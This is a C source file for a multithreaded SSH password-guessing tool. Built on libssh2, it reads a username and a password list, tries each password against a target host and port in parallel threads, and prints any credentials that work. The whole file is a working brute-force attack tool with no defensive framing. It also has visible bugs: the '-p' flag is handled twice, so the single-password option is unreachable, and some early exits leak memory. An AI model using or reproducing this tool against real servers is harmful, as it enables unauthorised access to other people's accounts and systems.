#include <libssh2.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>

#define MAX_LEN 256

typedef struct {
    const char *hostname;
    int port;
    const char *username;
    const char *password;
    int verbose;
} thread_args_t;

volatile int password_found = 0; // Global flag

void *try_credentials(void *args) {
    if (password_found) return NULL; // Exit if password already found

    thread_args_t *t_args = (thread_args_t *)args;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Failed to create socket");
        return NULL;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(t_args->port);
    sin.sin_addr.s_addr = inet_addr(t_args->hostname);

    fcntl(sock, F_SETFL, O_NONBLOCK);

    int rc = connect(sock, (struct sockaddr*)(&sin), sizeof(struct sockaddr_in));
    if (rc != 0 && errno != EINPROGRESS) {
        perror("Failed to connect");
        close(sock);
        return NULL;
    }

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);

    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;

    rc = select(sock + 1, NULL, &fds, NULL, &tv);
    if (rc <= 0) {
        perror("Failed to connect");
        close(sock);
        return NULL;
    }

    LIBSSH2_SESSION *session = libssh2_session_init();
    libssh2_session_set_blocking(session, 0);

    while (libssh2_session_handshake(session, sock) == LIBSSH2_ERROR_EAGAIN) {
        if (password_found) {
            close(sock);
            libssh2_session_free(session);
            return NULL;
        }
    }

    if (t_args->verbose) {
        printf("Attempting - Username: %s, Password: %s\n", t_args->username, t_args->password);
        fflush(stdout);
    }

    do {
        rc = libssh2_userauth_password(session, t_args->username, t_args->password);
        if (password_found) {
            close(sock);
            libssh2_session_free(session);
            return NULL;
        }
    } while (rc == LIBSSH2_ERROR_EAGAIN);

    if (rc == 0) {
        printf("Credentials found - Username: %s, Password: %s\n", t_args->username, t_args->password);
        password_found = 1; // Set global flag
    }

    libssh2_session_disconnect(session, "Normal Shutdown");
    libssh2_session_free(session);
    close(sock);
    free(t_args->password);
    free(t_args);
    return NULL;
}

void create_threads(const char *hostname, int port, const char *username, const char *password, FILE *pass_file, int thread_count, int verbose) {
    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
    if (threads == NULL) {
        perror("Failed to allocate memory for threads");
        exit(EXIT_FAILURE);
    }

    int current_thread = 0;
    char word[MAX_LEN];

    if (username != NULL) {
        if (password != NULL) {
            // Single credential test
            thread_args_t *t_args = malloc(sizeof(thread_args_t));
            t_args->hostname = hostname;
            t_args->port = port;
            t_args->username = username;
            t_args->password = strdup(password);
            t_args->verbose = verbose;

            if (pthread_create(&threads[current_thread], NULL, try_credentials, t_args) != 0) {
                perror("Failed to create thread");
                free(t_args->password);
                free(t_args);
            } else {
                current_thread++;
            }
        } else if (pass_file != NULL) {
            // Password list test
            while (fgets(word, sizeof(word), pass_file)) {
                if (password_found) break; // Exit if password found

                // Remove newline character
                char *newline = strchr(word, '\n');
                if (newline) *newline = '\0';

                // Prepare thread arguments
                thread_args_t *t_args = malloc(sizeof(thread_args_t));
                t_args->hostname = hostname;
                t_args->port = port;
                t_args->username = username;
                t_args->password = strdup(word);
                t_args->verbose = verbose;

                if (pthread_create(&threads[current_thread], NULL, try_credentials, t_args) != 0) {
                    perror("Failed to create thread");
                    free(t_args->password);
                    free(t_args);
                } else {
                    current_thread++;
                }

                // Wait for threads if the limit is reached
                if (current_thread >= thread_count) {
                    for (int i = 0; i < thread_count; i++) {
                        pthread_join(threads[i], NULL);
                    }
                    current_thread = 0;
                }
            }
        }
    }

    // Wait for all remaining threads to finish
    for (int i = 0; i < current_thread; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s -h <hostname> -p <port> [-u <username>] [-p <password> | -P <password_list>] [-t <thread_count>] [-V]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *hostname = NULL;
    int port = -1;
    const char *username = NULL;
    const char *password = NULL;
    const char *password_list = NULL;
    int thread_count = 4; // Default value
    int verbose = 0; // Default is non-verbose

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            hostname = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0) {
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-u") == 0) {
            username = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0) {
            password = argv[++i];
        } else if (strcmp(argv[i], "-P") == 0) {
            password_list = argv[++i];
        } else if (strcmp(argv[i], "-t") == 0) {
            thread_count = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-V") == 0) {
            verbose = 1;
        }
    }

    if (hostname == NULL || port == -1) {
        fprintf(stderr, "Hostname and port must be specified.\n");
        exit(EXIT_FAILURE);
    }

    if (username == NULL && password == NULL && password_list == NULL) {
        fprintf(stderr, "Either username or password (or password list) must be specified.\n");
        exit(EXIT_FAILURE);
    }

    if (username == NULL) {
        fprintf(stderr, "Username must be specified with -u.\n");
        exit(EXIT_FAILURE);
    }

    if (password == NULL && password_list == NULL) {
        fprintf(stderr, "Either password or password list must be specified.\n");
        exit(EXIT_FAILURE);
    }

    if (password != NULL && password_list != NULL) {
        fprintf(stderr, "You cannot specify both a password and a password list.\n");
        exit(EXIT_FAILURE);
    }

    FILE *pass_file = NULL;
    if (password_list != NULL) {
        pass_file = fopen(password_list, "r");
        if (pass_file == NULL) {
            perror("Failed to open password list file");
            exit(EXIT_FAILURE);
        }
    }

    libssh2_init(0);
    create_threads(hostname, port, username, password, pass_file, thread_count, verbose);
    libssh2_exit();

    if (pass_file != NULL) fclose(pass_file);

    return 0;
}
